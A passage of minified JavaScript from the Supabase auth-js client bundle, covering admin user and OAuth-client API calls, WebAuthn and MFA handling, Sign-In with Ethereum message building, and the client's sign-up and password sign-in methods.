0:m.split(","))!==null&&x!==void 0?x:[];return S.length>0&&(S.forEach(w=>{const E=parseInt(w.split(";")[0].split("=")[1].substring(0,1)),T=JSON.parse(w.split(";")[1].split("=")[1]);y[`${T}Page`]=E}),y.total=parseInt(_)),{data:Object.assign(Object.assign({},k),y),error:null}}catch(y){if(ce(y))return{data:{users:[]},error:y};throw y}}async getUserById(r){Dn(r);try{return await ye(this.fetch,"GET",`${this.url}/admin/users/${r}`,{headers:this.headers,xform:Ps})}catch(n){if(ce(n))return{data:{user:null},error:n};throw n}}async updateUserById(r,n){Dn(r);try{return await ye(this.fetch,"PUT",`${this.url}/admin/users/${r}`,{body:n,headers:this.headers,xform:Ps})}catch(l){if(ce(l))return{data:{user:null},error:l};throw l}}async deleteUser(r,n=!1){Dn(r);try{return await ye(this.fetch,"DELETE",`${this.url}/admin/users/${r}`,{headers:this.headers,body:{should_soft_delete:n},xform:Ps})}catch(l){if(ce(l))return{data:{user:null},error:l};throw l}}async _listFactors(r){Dn(r.userId);try{const{data:n,error:l}=await ye(this.fetch,"GET",`${this.url}/admin/users/${r.userId}/factors`,{headers:this.headers,xform:c=>({data:{factors:c},error:null})});return{data:n,error:l}}catch(n){if(ce(n))return{data:null,error:n};throw n}}async _deleteFactor(r){Dn(r.userId),Dn(r.id);try{return{data:await ye(this.fetch,"DELETE",`${this.url}/admin/users/${r.userId}/factors/${r.id}`,{headers:this.headers}),error:null}}catch(n){if(ce(n))return{data:null,error:n};throw n}}async _listOAuthClients(r){var n,l,c,u,h,m,x;try{const y={nextPage:null,lastPage:0,total:0},v=await ye(this.fetch,"GET",`${this.url}/admin/oauth/clients`,{headers:this.headers,noResolveJson:!0,query:{page:(l=(n=r?.page)===null||n===void 0?void 0:n.toString())!==null&&l!==void 0?l:"",per_page:(u=(c=r?.perPage)===null||c===void 0?void 0:c.toString())!==null&&u!==void 0?u:""},xform:cf});if(v.error)throw v.error;const k=await v.json(),_=(h=v.headers.get("x-total-count"))!==null&&h!==void 0?h:0,S=(x=(m=v.headers.get("link"))===null||m===void 0?void 0:m.split(","))!==null&&x!==void 0?x:[];return S.length>0&&(S.forEach(w=>{const E=parseInt(w.split(";")[0].split("=")[1].substring(0,1)),T=JSON.parse(w.split(";")[1].split("=")[1]);y[`${T}Page`]=E}),y.total=parseInt(_)),{data:Object.assign(Object.assign({},k),y),error:null}}catch(y){if(ce(y))return{data:{clients:[]},error:y};throw y}}async _createOAuthClient(r){try{return await ye(this.fetch,"POST",`${this.url}/admin/oauth/clients`,{body:r,headers:this.headers,xform:n=>({data:n,error:null})})}catch(n){if(ce(n))return{data:null,error:n};throw n}}async _getOAuthClient(r){try{return await ye(this.fetch,"GET",`${this.url}/admin/oauth/clients/${r}`,{headers:this.headers,xform:n=>({data:n,error:null})})}catch(n){if(ce(n))return{data:null,error:n};throw n}}async _updateOAuthClient(r,n){try{return await ye(this.fetch,"PUT",`${this.url}/admin/oauth/clients/${r}`,{body:n,headers:this.headers,xform:l=>({data:l,error:null})})}catch(l){if(ce(l))return{data:null,error:l};throw l}}async _deleteOAuthClient(r){try{return await ye(this.fetch,"DELETE",`${this.url}/admin/oauth/clients/${r}`,{headers:this.headers,noResolveJson:!0}),{data:null,error:null}}catch(n){if(ce(n))return{data:null,error:n};throw n}}async _regenerateOAuthClientSecret(r){try{return await ye(this.fetch,"POST",`${this.url}/admin/oauth/clients/${r}/regenerate_secret`,{headers:this.headers,xform:n=>({data:n,error:null})})}catch(n){if(ce(n))return{data:null,error:n};throw n}}}function uf(a={}){return{getItem:r=>a[r]||null,setItem:(r,n)=>{a[r]=n},removeItem:r=>{delete a[r]}}}const zn={debug:!!(globalThis&&qf()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class Hf extends Error{constructor(r){super(r),this.isAcquireTimeout=!0}}class ty extends Hf{}async function ry(a,r,n){zn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",a,r);const l=new globalThis.AbortController;return r>0&&setTimeout(()=>{l.abort(),zn.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",a)},r),await Promise.resolve().then(()=>globalThis.navigator.locks.request(a,r===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:l.signal},async c=>{if(c){zn.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",a,c.name);try{return await n()}finally{zn.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",a,c.name)}}else{if(r===0)throw zn.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",a),new ty(`Acquiring an exclusive Navigator LockManager lock "${a}" immediately failed`);if(zn.debug)try{const u=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(u,null,"  "))}catch(u){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",u)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await n()}}))}function sy(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}function Kf(a){if(!/^0x[a-fA-F0-9]{40}$/.test(a))throw new Error(`@supabase/auth-js: Address "${a}" is invalid.`);return a.toLowerCase()}function ny(a){return parseInt(a,16)}function ay(a){const r=new TextEncoder().encode(a);return"0x"+Array.from(r,l=>l.toString(16).padStart(2,"0")).join("")}function iy(a){var r;const{chainId:n,domain:l,expirationTime:c,issuedAt:u=new Date,nonce:h,notBefore:m,requestId:x,resources:y,scheme:v,uri:k,version:_}=a;{if(!Number.isInteger(n))throw new Error(`@supabase/auth-js: Invalid SIWE message field "chainId". Chain ID must be a EIP-155 chain ID. Provided value: ${n}`);if(!l)throw new Error('@supabase/auth-js: Invalid SIWE message field "domain". Domain must be provided.');if(h&&h.length<8)throw new Error(`@supabase/auth-js: Invalid SIWE message field "nonce". Nonce must be at least 8 characters. Provided value: ${h}`);if(!k)throw new Error('@supabase/auth-js: Invalid SIWE message field "uri". URI must be provided.');if(_!=="1")throw new Error(`@supabase/auth-js: Invalid SIWE message field "version". Version must be '1'. Provided value: ${_}`);if(!((r=a.statement)===null||r===void 0)&&r.includes(`
`))throw new Error(`@supabase/auth-js: Invalid SIWE message field "statement". Statement must not include '\\n'. Provided value: ${a.statement}`)}const S=Kf(a.address),w=v?`${v}://${l}`:l,E=a.statement?`${a.statement}
`:"",T=`${w} wants you to sign in with your Ethereum account:
${S}

${E}`;let D=`URI: ${k}
Version: ${_}
Chain ID: ${n}${h?`
Nonce: ${h}`:""}
Issued At: ${u.toISOString()}`;if(c&&(D+=`
Expiration Time: ${c.toISOString()}`),m&&(D+=`
Not Before: ${m.toISOString()}`),x&&(D+=`
Request ID: ${x}`),y){let z=`
Resources:`;for(const I of y){if(!I||typeof I!="string")throw new Error(`@supabase/auth-js: Invalid SIWE message field "resources". Every resource must be a valid string. Provided value: ${I}`);z+=`
- ${I}`}D+=z}return`${T}
${D}`}class ot extends Error{constructor({message:r,code:n,cause:l,name:c}){var u;super(r,{cause:l}),this.__isWebAuthnError=!0,this.name=(u=c??(l instanceof Error?l.name:void 0))!==null&&u!==void 0?u:"Unknown Error",this.code=n}}class gl extends ot{constructor(r,n){super({code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:n,message:r}),this.name="WebAuthnUnknownError",this.originalError=n}}function ly({error:a,options:r}){var n,l,c;const{publicKey:u}=r;if(!u)throw Error("options was missing required publicKey property");if(a.name==="AbortError"){if(r.signal instanceof AbortSignal)return new ot({message:"Registration ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:a})}else if(a.name==="ConstraintError"){if(((n=u.authenticatorSelection)===null||n===void 0?void 0:n.requireResidentKey)===!0)return new ot({message:"Discoverable credentials were required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_DISCOVERABLE_CREDENTIAL_SUPPORT",cause:a});if(r.mediation==="conditional"&&((l=u.authenticatorSelection)===null||l===void 0?void 0:l.userVerification)==="required")return new ot({message:"User verification was required during automatic registration but it could not be performed",code:"ERROR_AUTO_REGISTER_USER_VERIFICATION_FAILURE",cause:a});if(((c=u.authenticatorSelection)===null||c===void 0?void 0:c.userVerification)==="required")return new ot({message:"User verification was required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_USER_VERIFICATION_SUPPORT",cause:a})}else{if(a.name==="InvalidStateError")return new ot({message:"The authenticator was previously registered",code:"ERROR_AUTHENTICATOR_PREVIOUSLY_REGISTERED",cause:a});if(a.name==="NotAllowedError")return new ot({message:a.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:a});if(a.name==="NotSupportedError")return u.pubKeyCredParams.filter(m=>m.type==="public-key").length===0?new ot({message:'No entry in pubKeyCredParams was of type "public-key"',code:"ERROR_MALFORMED_PUBKEYCREDPARAMS",cause:a}):new ot({message:"No available authenticator supported any of the specified pubKeyCredParams algorithms",code:"ERROR_AUTHENTICATOR_NO_SUPPORTED_PUBKEYCREDPARAMS_ALG",cause:a});if(a.name==="SecurityError"){const h=window.location.hostname;if(Gf(h)){if(u.rp.id!==h)return new ot({message:`The RP ID "${u.rp.id}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:a})}else return new ot({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:a})}else if(a.name==="TypeError"){if(u.user.id.byteLength<1||u.user.id.byteLength>64)return new ot({message:"User ID was not between 1 and 64 characters",code:"ERROR_INVALID_USER_ID_LENGTH",cause:a})}else if(a.name==="UnknownError")return new ot({message:"The authenticator was unable to process the specified options, or could not create a new credential",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:a})}return new ot({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:a})}function oy({error:a,options:r}){const{publicKey:n}=r;if(!n)throw Error("options was missing required publicKey property");if(a.name==="AbortError"){if(r.signal instanceof AbortSignal)return new ot({message:"Authentication ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:a})}else{if(a.name==="NotAllowedError")return new ot({message:a.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:a});if(a.name==="SecurityError"){const l=window.location.hostname;if(Gf(l)){if(n.rpId!==l)return new ot({message:`The RP ID "${n.rpId}" is invalid for this domain`,code:"ERROR_INVALID_RP_ID",cause:a})}else return new ot({message:`${window.location.hostname} is an invalid domain`,code:"ERROR_INVALID_DOMAIN",cause:a})}else if(a.name==="UnknownError")return new ot({message:"The authenticator was unable to process the specified options, or could not create a new assertion signature",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:a})}return new ot({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:a})}class cy{createNewAbortSignal(){if(this.controller){const n=new Error("Cancelling existing WebAuthn API call for new one");n.name="AbortError",this.controller.abort(n)}const r=new AbortController;return this.controller=r,r.signal}cancelCeremony(){if(this.controller){const r=new Error("Manually cancelling existing WebAuthn API call");r.name="AbortError",this.controller.abort(r),this.controller=void 0}}}const uy=new cy;function dy(a){if(!a)throw new Error("Credential creation options are required");if(typeof PublicKeyCredential<"u"&&"parseCreationOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseCreationOptionsFromJSON=="function")return PublicKeyCredential.parseCreationOptionsFromJSON(a);const{challenge:r,user:n,excludeCredentials:l}=a,c=kl(a,["challenge","user","excludeCredentials"]),u=Wn(r).buffer,h=Object.assign(Object.assign({},n),{id:Wn(n.id).buffer}),m=Object.assign(Object.assign({},c),{challenge:u,user:h});if(l&&l.length>0){m.excludeCredentials=new Array(l.length);for(let x=0;x<l.length;x++){const y=l[x];m.excludeCredentials[x]=Object.assign(Object.assign({},y),{id:Wn(y.id).buffer,type:y.type||"public-key",transports:y.transports})}}return m}function hy(a){if(!a)throw new Error("Credential request options are required");if(typeof PublicKeyCredential<"u"&&"parseRequestOptionsFromJSON"in PublicKeyCredential&&typeof PublicKeyCredential.parseRequestOptionsFromJSON=="function")return PublicKeyCredential.parseRequestOptionsFromJSON(a);const{challenge:r,allowCredentials:n}=a,l=kl(a,["challenge","allowCredentials"]),c=Wn(r).buffer,u=Object.assign(Object.assign({},l),{challenge:c});if(n&&n.length>0){u.allowCredentials=new Array(n.length);for(let h=0;h<n.length;h++){const m=n[h];u.allowCredentials[h]=Object.assign(Object.assign({},m),{id:Wn(m.id).buffer,type:m.type||"public-key",transports:m.transports})}}return u}function fy(a){var r;if("toJSON"in a&&typeof a.toJSON=="function")return a.toJSON();const n=a;return{id:a.id,rawId:a.id,response:{attestationObject:nn(new Uint8Array(a.response.attestationObject)),clientDataJSON:nn(new Uint8Array(a.response.clientDataJSON))},type:"public-key",clientExtensionResults:a.getClientExtensionResults(),authenticatorAttachment:(r=n.authenticatorAttachment)!==null&&r!==void 0?r:void 0}}function py(a){var r;if("toJSON"in a&&typeof a.toJSON=="function")return a.toJSON();const n=a,l=a.getClientExtensionResults(),c=a.response;return{id:a.id,rawId:a.id,response:{authenticatorData:nn(new Uint8Array(c.authenticatorData)),clientDataJSON:nn(new Uint8Array(c.clientDataJSON)),signature:nn(new Uint8Array(c.signature)),userHandle:c.userHandle?nn(new Uint8Array(c.userHandle)):void 0},type:"public-key",clientExtensionResults:l,authenticatorAttachment:(r=n.authenticatorAttachment)!==null&&r!==void 0?r:void 0}}function Gf(a){return a==="localhost"||/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i.test(a)}function df(){var a,r;return!!(bt()&&"PublicKeyCredential"in window&&window.PublicKeyCredential&&"credentials"in navigator&&typeof((a=navigator?.credentials)===null||a===void 0?void 0:a.create)=="function"&&typeof((r=navigator?.credentials)===null||r===void 0?void 0:r.get)=="function")}async function my(a){try{const r=await navigator.credentials.create(a);return r?r instanceof PublicKeyCredential?{data:r,error:null}:{data:null,error:new gl("Browser returned unexpected credential type",r)}:{data:null,error:new gl("Empty credential response",r)}}catch(r){return{data:null,error:ly({error:r,options:a})}}}async function xy(a){try{const r=await navigator.credentials.get(a);return r?r instanceof PublicKeyCredential?{data:r,error:null}:{data:null,error:new gl("Browser returned unexpected credential type",r)}:{data:null,error:new gl("Empty credential response",r)}}catch(r){return{data:null,error:oy({error:r,options:a})}}}const gy={hints:["security-key"],authenticatorSelection:{authenticatorAttachment:"cross-platform",requireResidentKey:!1,userVerification:"preferred",residentKey:"discouraged"},attestation:"direct"},yy={userVerification:"preferred",hints:["security-key"],attestation:"direct"};function yl(...a){const r=c=>c!==null&&typeof c=="object"&&!Array.isArray(c),n=c=>c instanceof ArrayBuffer||ArrayBuffer.isView(c),l={};for(const c of a)if(c)for(const u in c){const h=c[u];if(h!==void 0)if(Array.isArray(h))l[u]=h;else if(n(h))l[u]=h;else if(r(h)){const m=l[u];r(m)?l[u]=yl(m,h):l[u]=yl(h)}else l[u]=h}return l}function vy(a,r){return yl(gy,a,r||{})}function wy(a,r){return yl(yy,a,r||{})}class by{constructor(r){this.client=r,this.enroll=this._enroll.bind(this),this.challenge=this._challenge.bind(this),this.verify=this._verify.bind(this),this.authenticate=this._authenticate.bind(this),this.register=this._register.bind(this)}async _enroll(r){return this.client.mfa.enroll(Object.assign(Object.assign({},r),{factorType:"webauthn"}))}async _challenge({factorId:r,webauthn:n,friendlyName:l,signal:c},u){try{const{data:h,error:m}=await this.client.mfa.challenge({factorId:r,webauthn:n});if(!h)return{data:null,error:m};const x=c??uy.createNewAbortSignal();if(h.webauthn.type==="create"){const{user:y}=h.webauthn.credential_options.publicKey;y.name||(y.name=`${y.id}:${l}`),y.displayName||(y.displayName=y.name)}switch(h.webauthn.type){case"create":{const y=vy(h.webauthn.credential_options.publicKey,u?.create),{data:v,error:k}=await my({publicKey:y,signal:x});return v?{data:{factorId:r,challengeId:h.id,webauthn:{type:h.webauthn.type,credential_response:v}},error:null}:{data:null,error:k}}case"request":{const y=wy(h.webauthn.credential_options.publicKey,u?.request),{data:v,error:k}=await xy(Object.assign(Object.assign({},h.webauthn.credential_options),{publicKey:y,signal:x}));return v?{data:{factorId:r,challengeId:h.id,webauthn:{type:h.webauthn.type,credential_response:v}},error:null}:{data:null,error:k}}}}catch(h){return ce(h)?{data:null,error:h}:{data:null,error:new sn("Unexpected error in challenge",h)}}}async _verify({challengeId:r,factorId:n,webauthn:l}){return this.client.mfa.verify({factorId:n,challengeId:r,webauthn:l})}async _authenticate({factorId:r,webauthn:{rpId:n=typeof window<"u"?window.location.hostname:void 0,rpOrigins:l=typeof window<"u"?[window.location.origin]:void 0,signal:c}={}},u){if(!n)return{data:null,error:new Va("rpId is required for WebAuthn authentication")};try{if(!df())return{data:null,error:new sn("Browser does not support WebAuthn",null)};const{data:h,error:m}=await this.challenge({factorId:r,webauthn:{rpId:n,rpOrigins:l},signal:c},{request:u});if(!h)return{data:null,error:m};const{webauthn:x}=h;return this._verify({factorId:r,challengeId:h.challengeId,webauthn:{type:x.type,rpId:n,rpOrigins:l,credential_response:x.credential_response}})}catch(h){return ce(h)?{data:null,error:h}:{data:null,error:new sn("Unexpected error in authenticate",h)}}}async _register({friendlyName:r,webauthn:{rpId:n=typeof window<"u"?window.location.hostname:void 0,rpOrigins:l=typeof window<"u"?[window.location.origin]:void 0,signal:c}={}},u){if(!n)return{data:null,error:new Va("rpId is required for WebAuthn registration")};try{if(!df())return{data:null,error:new sn("Browser does not support WebAuthn",null)};const{data:h,error:m}=await this._enroll({friendlyName:r});if(!h)return await this.client.mfa.listFactors().then(v=>{var k;return(k=v.data)===null||k===void 0?void 0:k.all.find(_=>_.factor_type==="webauthn"&&_.friendly_name===r&&_.status!=="unverified")}).then(v=>v?this.client.mfa.unenroll({factorId:v?.id}):void 0),{data:null,error:m};const{data:x,error:y}=await this._challenge({factorId:h.id,friendlyName:h.friendly_name,webauthn:{rpId:n,rpOrigins:l},signal:c},{create:u});return x?this._verify({factorId:h.id,challengeId:x.challengeId,webauthn:{rpId:n,rpOrigins:l,type:x.webauthn.type,credential_response:x.webauthn.credential_response}}):{data:null,error:y}}catch(h){return ce(h)?{data:null,error:h}:{data:null,error:new sn("Unexpected error in register",h)}}}}sy();const jy={url:gg,storageKey:yg,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:vg,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1,throwOnError:!1,lockAcquireTimeout:1e4};async function hf(a,r,n){return await n()}const Un={};class Ha{get jwks(){var r,n;return(n=(r=Un[this.storageKey])===null||r===void 0?void 0:r.jwks)!==null&&n!==void 0?n:{keys:[]}}set jwks(r){Un[this.storageKey]=Object.assign(Object.assign({},Un[this.storageKey]),{jwks:r})}get jwks_cached_at(){var r,n;return(n=(r=Un[this.storageKey])===null||r===void 0?void 0:r.cachedAt)!==null&&n!==void 0?n:Number.MIN_SAFE_INTEGER}set jwks_cached_at(r){Un[this.storageKey]=Object.assign(Object.assign({},Un[this.storageKey]),{cachedAt:r})}constructor(r){var n,l,c;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.autoRefreshTickTimeout=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log;const u=Object.assign(Object.assign({},jy),r);if(this.storageKey=u.storageKey,this.instanceID=(n=Ha.nextInstanceID[this.storageKey])!==null&&n!==void 0?n:0,Ha.nextInstanceID[this.storageKey]=this.instanceID+1,this.logDebugMessages=!!u.debug,typeof u.debug=="function"&&(this.logger=u.debug),this.instanceID>0&&bt()){const h=`${this._logPrefix()} Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.`;console.warn(h),this.logDebugMessages&&console.trace(h)}if(this.persistSession=u.persistSession,this.autoRefreshToken=u.autoRefreshToken,this.admin=new ey({url:u.url,headers:u.headers,fetch:u.fetch}),this.url=u.url,this.headers=u.headers,this.fetch=Vf(u.fetch),this.lock=u.lock||hf,this.detectSessionInUrl=u.detectSessionInUrl,this.flowType=u.flowType,this.hasCustomAuthorizationHeader=u.hasCustomAuthorizationHeader,this.throwOnError=u.throwOnError,this.lockAcquireTimeout=u.lockAcquireTimeout,u.lock?this.lock=u.lock:this.persistSession&&bt()&&(!((l=globalThis?.navigator)===null||l===void 0)&&l.locks)?this.lock=ry:this.lock=hf,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this),webauthn:new by(this)},this.oauth={getAuthorizationDetails:this._getAuthorizationDetails.bind(this),approveAuthorization:this._approveAuthorization.bind(this),denyAuthorization:this._denyAuthorization.bind(this),listGrants:this._listOAuthGrants.bind(this),revokeGrant:this._revokeOAuthGrant.bind(this)},this.persistSession?(u.storage?this.storage=u.storage:qf()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=uf(this.memoryStorage)),u.userStorage&&(this.userStorage=u.userStorage)):(this.memoryStorage={},this.storage=uf(this.memoryStorage)),bt()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(h){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",h)}(c=this.broadcastChannel)===null||c===void 0||c.addEventListener("message",async h=>{this._debug("received broadcast notification from other tab or client",h),await this._notifyAllSubscribers(h.data.event,h.data.session,!1)})}this.initialize()}isThrowOnErrorEnabled(){return this.throwOnError}_returnResult(r){if(this.throwOnError&&r&&r.error)throw r.error;return r}_logPrefix(){return`GoTrueClient@${this.storageKey}:${this.instanceID} (${Ff}) ${new Date().toISOString()}`}_debug(...r){return this.logDebugMessages&&this.logger(this._logPrefix(),...r),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(this.lockAcquireTimeout,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){var r;try{let n={},l="none";if(bt()&&(n=Ig(window.location.href),this._isImplicitGrantCallback(n)?l="implicit":await this._isPKCECallback(n)&&(l="pkce")),bt()&&this.detectSessionInUrl&&l!=="none"){const{data:c,error:u}=await this._getSessionFromURL(n,l);if(u){if(this._debug("#_initialize()","error detecting session from URL",u),Ng(u)){const x=(r=u.details)===null||r===void 0?void 0:r.code;if(x==="identity_already_exists"||x==="identity_not_found"||x==="single_identity_not_deletable")return{error:u}}return{error:u}}const{session:h,redirectType:m}=c;return this._debug("#_initialize()","detected session in URL",h,"redirect type",m),await this._saveSession(h),setTimeout(async()=>{m==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",h):await this._notifyAllSubscribers("SIGNED_IN",h)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(n){return ce(n)?this._returnResult({error:n}):this._returnResult({error:new sn("Unexpected error during initialization",n)})}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(r){var n,l,c;try{const u=await ye(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{data:(l=(n=r?.options)===null||n===void 0?void 0:n.data)!==null&&l!==void 0?l:{},gotrue_meta_security:{captcha_token:(c=r?.options)===null||c===void 0?void 0:c.captchaToken}},xform:kr}),{data:h,error:m}=u;if(m||!h)return this._returnResult({data:{user:null,session:null},error:m});const x=h.session,y=h.user;return h.session&&(await this._saveSession(h.session),await this._notifyAllSubscribers("SIGNED_IN",x)),this._returnResult({data:{user:y,session:x},error:null})}catch(u){if(ce(u))return this._returnResult({data:{user:null,session:null},error:u});throw u}}async signUp(r){var n,l,c;try{let u;if("email"in r){const{email:v,password:k,options:_}=r;let S=null,w=null;this.flowType==="pkce"&&([S,w]=await $n(this.storage,this.storageKey)),u=await ye(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:_?.emailRedirectTo,body:{email:v,password:k,data:(n=_?.data)!==null&&n!==void 0?n:{},gotrue_meta_security:{captcha_token:_?.captchaToken},code_challenge:S,code_challenge_method:w},xform:kr})}else if("phone"in r){const{phone:v,password:k,options:_}=r;u=await ye(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:v,password:k,data:(l=_?.data)!==null&&l!==void 0?l:{},channel:(c=_?.channel)!==null&&c!==void 0?c:"sms",gotrue_meta_security:{captcha_token:_?.captchaToken}},xform:kr})}else throw new rl("You must provide either an email or phone number and a password");const{data:h,error:m}=u;if(m||!h)return await wt(this.storage,`${this.storageKey}-code-verifier`),this._returnResult({data:{user:null,session:null},error:m});const x=h.session,y=h.user;return h.session&&(await this._saveSession(h.session),await this._notifyAllSubscribers("SIGNED_IN",x)),this._returnResult({data:{user:y,session:x},error:null})}catch(u){if(await wt(this.storage,`${this.storageKey}-code-verifier`),ce(u))return this._returnResult({data:{user:null,session:null},error:u});throw u}}async signInWithPassword(r){try{let n;if("email"in r){const{email:u,password:h,options:m}=r;n=await ye(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:u,password:h,gotrue_meta_security:{captcha_token:m?.captchaToken}},xform:of})}else if("phone"in r){const{phone:u,password:h,options:m}=r;n=await ye(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:u,password:h,gotrue_meta_security:{captcha_token:m?.captchaToken}},xform:of})}else throw new rl("You must provide either an email or phone number and a password");const{data:l,error:c}=n;if(c)return this._returnResult({data:{user:null,session:null},error:c});if(!l||!l.session||!l.user){const u=new In;return this._returnResult({data:{user:null,session:null},error:u})}return l.session&&(await this._saveSession(l.session),await this._notifyAllSubscribers("SIGNED_IN",l.session)),this._returnResult({data:Object.assign({user:l.user,session:l.session},l.weak_password?{weakPassword:l.weak_password}:null),error:c})}catch(n){if(ce(n))return this._returnResult({data:{user:null,session:null},error:n});throw n}}async signInWithOAuth(r){var n,l,c,u;return await this._handleProviderSignIn(r.provider,{redirectTo:(n=r.options)===null||n===void 0?void 0:n.redirectTo,scopes:(l=r.options)===null||l===void 0?void 0:l.scopes,queryParams:(c=r.options)===null||c===void 0?void 0:c.queryParams,skipBrowserRedirect:(u=r.options)===null||u===void 0?void 0:u.skipBrowserRedirect})}async exchangeCodeForSession(r){return await this.initializePromise,this._acquireLock(this.lockAcquireTimeout,async()=>this._exchangeCodeForSession(r))}async signInWithWeb3(r){const{chain:n}=r;switch(n){case"ethereum":return await this.signInWithEthereum(r);case"solana":return await this.signInWithSolana(r);default:throw new Error(`@supabase/auth-js: Unsupported chain "${n}"`)}}async signInWithEthereum(r){var n,l,c,u,h,m,x,y,v,k,_;let S,w;if("message"in r)S=r.message,w=r.signature;else{const{chain:E,wallet:T,statement:D,options:z}=r;let I;if(bt())if(typeof T=="object")I=T;else{const ue=window;if("ethereum"in ue&&typeof ue.ethereum=="object"&&"request"in ue.ethereum&&typeof ue.ethereum.request=="function")I=ue.ethereum;else throw new Error("@supabase/auth-js: No compatible Ethereum wallet interface on the window object (window.ethereum) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'ethereum', wallet: resolvedUserWallet }) instead.")}else{if(typeof T!="object"||!z?.url)throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");I=T}const H=new URL((n=z?.url)!==null&&n!==void 0?n:window.location.href),te=await I.request({method:"eth_requestAccounts"}).then(ue=>ue).catch(()=>{throw new Error("@supabase/auth-js: Wallet method eth_requestAccounts is missing or invalid")});if(!te||te.length===0)throw new Error("@supabase/auth-js: No accounts available. Please ensure the wallet is connected.");const J=Kf(te[0]);let F=(l=z?.signInWithEthereum)===null||l===void 0?void 0:l.chainId;if(!F){const ue=await I.request({method:"eth_chainId"});F=ny(ue)}const ne={domain:H.host,address:J,statement:D,uri:H.href,version:"1",chainId:F,nonce:(c=z?.signInWithEthereum)===null||c===void 0?void 0:c.nonce,issuedAt:(h=(u=z?.signInWithEthereum)===null||u===void 0?void 0:u.issuedAt)!==null&&h!==void 0?h:new Date,expirationTime:(m=z?.signInWithEthereum)===null||m===void 0?void 0:m.expirationTime,notBefore:(x=z?.signInWithEthereum)===null||x===void 0?void 0:x.notBefore,requestId:(y=z?.signInWithEthereum)===null||y===void 0?void 0:y.requestId,resources:(v=z?.signInWithEthereum)===null||v===void 0?void 0:v.resources};S=iy(ne),w=await I.request({method:"personal_sign",params:[ay(S),J]})}try{const{data:E,error:T}=await ye(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"ethereum",message:S,signature:w},!((k=r.options)===null||k===void 0)&&k.captchaToken?{gotrue_meta_security:{captcha_token:(_=r.options)===null||_===void 0?void 0:_.captchaToken}}:null),xform:kr});if(T)throw T;if(!E||!E.session||!E.user){const D=new In;return this._returnResult({data:{user:null,session:null},error:D})}return E.session&&(await this._saveSession(E.session),await this._notifyAllSubscribers("SIGNED_IN",E.session)),this._returnResult({data:Object.assign({},E),error:T})}catch(E){if(ce(E))return this._returnResult({data:{user:null,session:null},error:E});throw E}}async signInWithSolana(r){var n,l,c,u,h,m,x,y,v,k,_,S;let 